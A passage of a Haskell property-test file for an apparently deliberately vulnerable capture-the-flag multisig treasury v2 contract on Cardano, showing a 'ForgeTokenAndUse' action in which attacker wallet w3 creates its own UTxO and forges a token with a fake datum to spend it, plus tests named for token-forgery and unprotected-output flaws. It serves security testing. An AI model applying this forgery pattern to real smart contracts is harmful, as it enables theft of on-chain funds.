              releaseVal = fromInteger (mv2ReleaseValue datum) :: C.Lovelace
              txBody = execBuildTx $ useMultisigV2 @C.ConwayEra txIn beneficiaryAddr releaseVal signer
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to use multisig v2: " ++ show err
            Right _ -> pure ()
    ForgeTokenAndUse -> do
      -- For the property test, we need a simplified approach.
      -- The attacker will use w3 and create their own UTxO first.
      -- But since we're in the model's perform, we simulate the attack differently:
      --
      -- Actually, the ForgeTokenAndUse in the property model needs to work on the
      -- EXISTING UTxO. The attack is: if anyone can mint a token, and the existing
      -- UTxO has ANY signed_user that the attacker can impersonate... wait, they can't.
      --
      -- The TRUE exploit requires the attacker to CREATE their own UTxO with their
      -- own datum. But that's a separate action from using an existing one.
      --
      -- For simplicity in property tests, let's make ForgeTokenAndUse work when
      -- the attacker (w3) creates a new UTxO and uses it in one go, destroying
      -- any existing UTxOs as a side effect.
      --
      -- OR: we can just have this action fail if there's no signed_user the attacker
      -- controls. But w3 isn't in the original signed_users.
      --
      -- Let's make this a 2-step process internally:
      -- 1. Create attacker's UTxO
      -- 2. Use it

      -- First, create attacker's UTxO (w3)
      let createTxBody = execBuildTx $ createAttackerDatum @C.ConwayEra Defaults.networkId Wallet.w3 20_000_000
      runExceptT (balanceAndSubmit mempty Wallet.w3 createTxBody TrailingChange []) >>= \case
        Left err -> fail $ "Failed to create attacker UTxO: " ++ show err
        Right _ -> pure ()

      -- Now find the attacker's UTxO (it'll be one with w3 in signed_users)
      allUtxos <- findMultisigV2Utxos
      let attackerUtxos = filter (\(_, _, d) -> walletPkhBytes Wallet.w3 `elem` mv2SignedUsers d) allUtxos
      case attackerUtxos of
        [] -> fail "No attacker UTxO found"
        ((txIn, value, _) : _) -> do
          let exploitTxBody = execBuildTx $ createFakeDatumAndUse @C.ConwayEra Defaults.networkId txIn value Wallet.w3
          runExceptT (balanceAndSubmit mempty Wallet.w3 exploitTxBody TrailingChange []) >>= \case
            Left err -> fail $ "Token forgery exploit failed: " ++ show err
            Right _ -> pure ()

  validate _model = pure True

  monitoring _state _action prop = prop

  -- Note: threatModels empty for same reasons as v1
  threatModels = []

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Multisig Treasury V2 tests grouped together
aikenMultisigTreasuryV2Tests :: RunOptions -> TestTree
aikenMultisigTreasuryV2Tests runOpts =
  testGroup
    "ctf multisig_treasury_v2"
    [ aikenMultisigV2UnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @MultisigV2Model
            "property-based testing"
            runOpts
        , testProperty
            "vulnerable to token forgery"
            (propMultisigV2TokenForgeryExploit runOpts)
        , testProperty
            "vulnerable to unprotected script output (expectFailure)"
            (propMultisigV2UnprotectedOutput runOpts)
        ]
    ]
